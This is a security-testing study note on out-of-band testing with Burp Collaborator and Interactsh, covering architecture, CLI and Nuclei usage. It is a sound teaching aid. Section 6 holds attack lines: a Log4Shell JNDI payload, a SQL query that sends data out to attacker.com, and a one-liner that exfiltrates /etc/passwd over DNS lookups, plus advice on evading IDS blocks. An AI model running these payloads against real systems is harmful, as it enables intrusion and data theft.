---
tags: [tools, vapt, utility]
difficulty: intermediate
module: "41 - Tools"
topic: "41.29 Interactsh Burp Collaborator"
---

# Out-of-Band Application Security Testing (OAST): Interactsh & Burp Collaborator

## 1. Introduction to OAST

Out-of-Band Application Security Testing (OAST) has revolutionized how security professionals discover asynchronous, blind, and delayed vulnerabilities. Traditional vulnerability scanning relies on analyzing the direct HTTP response to a malicious request (In-Band). However, many modern vulnerabilities do not reflect in the immediate response. 

Examples include:
- **Blind Server-Side Request Forgery (SSRF):** The server makes an external request based on attacker input, but returns a generic "200 OK" or "Success" message to the attacker regardless of the outcome.
- **Blind Cross-Site Scripting (XSS):** The payload is stored in a database and later executed in an administrator's browser viewing a log panel; the attacker never sees the execution in their own browser.
- **Asynchronous Command Injection:** The command executes in a background queue worker; the immediate web response does not contain the output of the injected command.

OAST solves this by providing an external, attacker-controlled infrastructure (listening for DNS, HTTP, SMTP). The attacker injects payloads that, when executed by the target, force the target to communicate with this external infrastructure. If the OAST server receives an interaction, a vulnerability is conclusively confirmed.

## 2. OAST Architecture (ASCII Diagram)

```text
+-------------------+      1. Malicious Payload      +-------------------+
|                   |      (e.g., <img src=          |                   |
|  Attacker System  | -------- "http://oast.me"> ) ->| Target Web Server |
|                   |                                | (Vulnerable App)  |
+-------------------+                                +-------------------+
        ^                                                     |
        |                                                     | 2. Vulnerability
        |                                                     |    Triggers
        | 4. Polling/                                         |    (Background)
        |    Notification                                     v
+-------------------+      3. Out-of-Band Comm.      +-------------------+
|                   |      (DNS Query, HTTP GET)     |                   |
|    OAST Server    | <----------------------------- | Target System /   |
| (Burp Collab /    |                                | Internal Network /|
|  Interactsh)      |                                | Admin Browser     |
+-------------------+                                +-------------------+
```

## 3. Burp Collaborator Deep Dive

### 3.1 Overview
Burp Collaborator is the default OAST solution integrated directly into PortSwigger's Burp Suite Professional and Enterprise. It is seamless, highly reliable, and forms the backbone of the Burp Scanner's ability to find complex, out-of-band vulnerabilities without requiring complex infrastructure setup from the user.

### 3.2 How It Works
When testing, you can generate a unique Collaborator payload (a randomly generated subdomain like `xyz123.oastify.com`). You inject this into your target. The Collaborator server listens for DNS, HTTP, HTTPS, and SMTP interactions. Burp Suite periodically polls the Collaborator server in the background. If the target interacted with `xyz123.oastify.com`, the Collaborator server records the details (source IP, headers, protocol, exact timestamp) and sends them back to your Burp Suite interface.

### 3.3 Key Features
- **Deep Integration:** Automatically used by Burp Scanner. Interactions show up directly in the Target and Issue Activity tabs seamlessly.
- **Multiple Protocols:** Captures DNS, HTTP, and SMTP natively.
- **Private Instances:** Organizations can deploy a private Collaborator server to keep all OAST traffic internal, satisfying strict data privacy and compliance requirements (e.g., ensuring client data never leaves their network).
- **Collaborator Client:** A manual interface within Burp to generate payloads and monitor interactions in real-time.

### 3.4 Limitations
- Requires a paid Burp Suite Professional/Enterprise license for full automated functionality.
- The public `oastify.com` and `burpcollaborator.net` domains are frequently blocked by corporate firewalls, IDS/IPS, and threat intelligence feeds, leading to false negatives.

## 4. Interactsh Deep Dive

### 4.1 Overview
Interactsh is an open-source OAST tool developed by ProjectDiscovery. It was designed to provide a highly scalable, self-hostable, and easily automatable alternative to commercial OAST solutions. It is heavily integrated into the Nuclei vulnerability scanner ecosystem, enabling massive-scale blind testing.

### 4.2 Architecture
Interactsh consists of two main components:
1.  **Interactsh-Server:** The backend infrastructure that handles incoming DNS, HTTP, SMTP, and LDAP requests. It can be easily self-hosted on a VPS using Docker.
2.  **Interactsh-Client:** The CLI or programmatic interface used by the attacker to generate payloads, poll the server, and receive notifications via terminal or webhook.

### 4.3 Key Features
- **Open Source & Free:** Accessible to everyone, regardless of licensing budget.
- **Custom Domains:** You can easily configure it to run on your own domain (e.g., `oast.yourcompany.com`), bypassing many commercial blacklists and IDS signatures.
- **More Protocols:** Supports DNS, HTTP, SMTP, and crucially, LDAP (which proved essential for the widespread discovery of Log4Shell).
- **Wildcard Support:** Supports wildcard interactions, allowing dynamic payload generation on the fly without pre-registering the subdomain.
- **CLI Centric:** Designed specifically for terminal users and CI/CD pipeline integration.

### 4.4 Usage Examples (Interactsh CLI)

```bash
# Start the client using the default public server
interactsh-client

# The client generates a unique URL, e.g.:
# [INF] Interactsh URL: c7xyz123.interact.sh
# [INF] Listening for interactions...

# In another terminal, simulate a vulnerability triggering the payload:
curl http://c7xyz123.interact.sh/sensitive_data

# The interactsh-client will immediately output:
# [c7xyz123] Received HTTP interaction from 192.168.1.50 at 2026-06-09 10:00:00
# [c7xyz123] Request:
# GET /sensitive_data HTTP/1.1
# Host: c7xyz123.interact.sh
# User-Agent: curl/7.68.0
```

### 4.5 Integration with Nuclei
Interactsh's true power shines when combined with Nuclei. Nuclei templates can seamlessly generate interactsh payloads and define matchers based on OAST interactions.

```yaml
# Snippet of a Nuclei template using Interactsh
requests:
  - raw:
      - |
        GET /vulnerable_endpoint?url=http://{{interactsh-url}} HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: interactsh_protocol # Confirms we received an OAST hit
        words:
          - "http"
```

## 5. Comparison: Burp Collaborator vs. Interactsh

| Feature | Burp Collaborator | Interactsh |
| :--- | :--- | :--- |
| **License** | Commercial (Burp Pro) | Open Source (MIT) |
| **Integration** | Burp Suite | CLI, Nuclei, Go API |
| **Protocols** | DNS, HTTP, HTTPS, SMTP | DNS, HTTP, HTTPS, SMTP, LDAP |
| **Customization** | Harder (requires custom server setup) | Very Easy (built for custom deployments) |
| **Evasion** | Often blocked (public servers) | Custom domains easily evade blocks |
| **Target Audience**| Manual Web Testers | Automation Engineers, DevSecOps |

## 6. Real-World Exploitation Scenarios

### 6.1 Log4Shell (CVE-2021-44228)
OAST tools were the primary method for discovering Log4Shell across the internet. Attackers injected payloads like `${jndi:ldap://{{interactsh-url}}/a}` into every conceivable HTTP header, input field, and user-agent string. If the application logged the string using a vulnerable Log4j version, it would perform a DNS lookup and LDAP connection to the OAST server, instantly confirming the vulnerability without needing a direct HTTP response.

### 6.2 Blind SQL Injection Data Exfiltration
In a highly restricted Blind SQLi scenario, traditional boolean or time-based extraction might be too slow or filtered by WAFs analyzing response latency. An attacker can use an OAST payload combined with database functions (e.g., `xp_dirtree` in MSSQL or `LOAD_FILE()` in MySQL) to exfiltrate the database version or current user via DNS lookups:
`SELECT LOAD_FILE(CONCAT('\\\\', (SELECT @@version), '.attacker.com\\test'));`

### 6.3 Advanced DNS Exfiltration Techniques
When strict egress filtering blocks HTTP/HTTPS outbound traffic, DNS is often left open to allow recursive resolution. Attackers leverage this by encoding data into DNS subdomains.
Consider a scenario where an attacker has Command Injection but no output is returned. They can use `xxd` or `base64` to encode a sensitive file and send it via ping or nslookup to their Interactsh server.
Example using `base64` to exfiltrate `/etc/passwd`:
`cat /etc/passwd | base64 -w 32 | while read line; do nslookup $line.c7xyz123.interact.sh; done`
The Interactsh server will receive a flood of DNS queries looking like:
`cm9vdDp4OjA6MDpyb290Oi9yb290Oi9i.c7xyz123.interact.sh`
The attacker can then export the logs from Interactsh, isolate the subdomains, and decode the base64 string to reconstruct the `/etc/passwd` file entirely out-of-band.

## 7. Conclusion

OAST is no longer an advanced technique; it is a fundamental requirement for modern web application testing. Burp Collaborator remains the gold standard for manual, GUI-driven testing within the PortSwigger ecosystem. Interactsh provides a powerful, scriptable, and highly customizable alternative that excels in automated scanning environments, continuous integration pipelines, and custom payload delivery.

## 8. Chaining Opportunities
- Use Interactsh within [[37 - Nuclei]] templates to find blind vulnerabilities at massive scale.
- Combine with [[35 - SQLMap]] to exfiltrate data via DNS when traditional Blind SQLi is too slow.
- Inject OAST payloads using [[42 - Burp Suite Pro Features]] Intruder to test for delayed asynchronous execution in background workers.

## 9. Related Notes
- [[19 - Server-Side Request Forgery (SSRF)]]
- [[18 - Cross-Site Scripting (XSS)]]
- [[21 - Command Injection]]
- [[10 - Advanced Web Attacks]]
